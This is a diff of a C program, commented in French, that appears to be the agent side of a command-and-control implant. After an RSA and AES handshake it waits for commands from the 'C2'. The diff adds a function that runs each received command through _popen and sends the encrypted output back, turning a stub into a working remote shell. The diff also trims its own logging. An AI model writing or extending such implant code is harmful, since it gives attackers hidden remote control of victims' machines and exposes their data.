@@ -19,6 +19,8 @@ typedef struct {
 
 static uint16_t g_seq = 0;
 
+/* ---------- Envoi du MSG_KEYX ---------- */
+
 static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
 {
     uint8_t der[1024];
@@ -48,6 +50,8 @@ static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
     printf("[+] MSG_KEYX envoyé (%d octets)\n", packet_len);
     return 0;
 }
+
+/* ---------- Réception du MSG_AUTH ---------- */
 
 static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
                      fso_session_t *sess)
@@ -97,6 +101,85 @@ static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
     printf("[+] Session établie (clé AES de %zu octets)\n", aes_len);
     return 0;
 }
+
+/* ============================================================
+ * Exécution d'une commande via _popen
+ * ============================================================ */
+
+static int execute_command(fso_conn_t *conn, const uint8_t *aes_key,
+                           const uint8_t *cmd, uint32_t cmd_len)
+{
+    /* Copie la commande dans un buffer null-terminé. */
+    char cmd_str[1024];
+    if (cmd_len >= sizeof(cmd_str)) cmd_len = sizeof(cmd_str) - 1;
+    memcpy(cmd_str, cmd, cmd_len);
+    cmd_str[cmd_len] = '\0';
+
+    printf("[C2] Exécution : %s\n", cmd_str);
+
+    /* Buffer de sortie (1 Mo max). */
+    uint8_t *output = malloc(FSO_MAX_PAYLOAD);
+    if (!output) {
+        fprintf(stderr, "[-] malloc échoué\n");
+        return -1;
+    }
+    size_t total = 0;
+
+    /* Exécute la commande. */
+    FILE *fp = _popen(cmd_str, "r");
+    if (!fp) {
+        fprintf(stderr, "[-] _popen échoué\n");
+        const char *err = "[-] Échec d'exécution de la commande\n";
+        size_t elen = strlen(err);
+        fso_conn_send_secure(conn, aes_key, MSG_RESULT, g_seq++,
+                             (const uint8_t *)err, (uint32_t)elen);
+        free(output);
+        return -1;
+    }
+
+    /* Lit la sortie ligne par ligne. */
+    char line[1024];
+    while (fgets(line, sizeof(line), fp) != NULL) {
+        size_t len = strlen(line);
+        if (total + len + 1 > FSO_MAX_PAYLOAD) {
+            /* Tronqué */
+            const char *trunc = "\n[...sortie tronquée...]\n";
+            size_t tlen = strlen(trunc);
+            if (total + tlen < FSO_MAX_PAYLOAD) {
+                memcpy(output + total, trunc, tlen);
+                total += tlen;
+            }
+            break;
+        }
+        memcpy(output + total, line, len);
+        total += len;
+    }
+
+    _pclose(fp);
+
+    /* Si aucune sortie, envoyer une chaîne vide marquée. */
+    if (total == 0) {
+        const char *empty = "(pas de sortie)\n";
+        total = strlen(empty);
+        memcpy(output, empty, total);
+    }
+
+    /* Envoi du résultat chiffré. */
+    if (fso_conn_send_secure(conn, aes_key, MSG_RESULT, g_seq++,
+                             output, (uint32_t)total) < 0) {
+        fprintf(stderr, "[-] Envoi MSG_RESULT échoué\n");
+        free(output);
+        return -1;
+    }
+
+    printf("[+] Résultat envoyé (%zu octets)\n", total);
+    free(output);
+    return 0;
+}
+
+/* ============================================================
+ * main
+ * ============================================================ */
 
 int main(int argc, char **argv)
 {
@@ -152,62 +235,46 @@ int main(int argc, char **argv)
     printf("\n[+] Session sécurisée active\n\n");
     printf("[*] En attente de commandes du C2...\n");
 
-    uint8_t *payload = malloc(FSO_MAX_PAYLOAD);
-    if (!payload) {
-        fprintf(stderr, "[-] malloc échoué\n");
-        goto cleanup;
-    }
-
     while (conn.connected) {
         fso_header_t header;
+        uint8_t *payload = malloc(FSO_MAX_PAYLOAD);
+        if (!payload) {
+            fprintf(stderr, "[-] malloc échoué\n");
+            break;
+        }
 
         int n = fso_conn_recv_secure(&conn, sess.aes_key,
                                       &header, payload, FSO_MAX_PAYLOAD);
         if (n < 0) {
             printf("[-] Erreur de réception\n");
+            free(payload);
             break;
         }
 
-        /* ---------- Dispatch par type ---------- */
         switch (header.type) {
 
         case MSG_PING: {
-            /* Répondre immédiatement avec un PONG. */
             uint8_t pong_byte = 0x00;
-            if (fso_conn_send_secure(&conn, sess.aes_key, MSG_PONG,
-                                      g_seq++, &pong_byte, 1) < 0) {
-                fprintf(stderr, "[-] Envoi MSG_PONG échoué\n");
-            } else {
-                printf("[keepalive] MSG_PING reçu, PONG renvoyé\n");
-            }
+            fso_conn_send_secure(&conn, sess.aes_key, MSG_PONG,
+                                 g_seq++, &pong_byte, 1);
             break;
         }
 
         case MSG_PONG:
-            printf("[keepalive] MSG_PONG reçu\n");
             break;
 
         case MSG_CMD:
-            printf("[C2] commande reçue (%d octets)\n", n);
-            if (n > 0) {
-                fwrite(payload, 1, (size_t)n, stdout);
-                printf("\n");
-            }
-            /* TODO : exécuter la commande et renvoyer MSG_RESULT. */
+            execute_command(&conn, sess.aes_key, payload, (uint32_t)n);
             break;
 
         default:
             printf("[C2] type=0x%02X seq=%u, %d octets\n",
                    header.type, header.seq_id, n);
-            if (n > 0) {
-                fwrite(payload, 1, (size_t)n, stdout);
-                printf("\n");
-            }
             break;
         }
-    }
 
-    free(payload);
+        free(payload);
+    }
 
 cleanup:
     printf("[*] Déconnexion\n");
@@ -215,6 +282,5 @@ cleanup:
     fso_conn_cleanup();
     fso_rsa_free(&kp);
     fso_crypto_cleanup();
-
     return 0;
 }
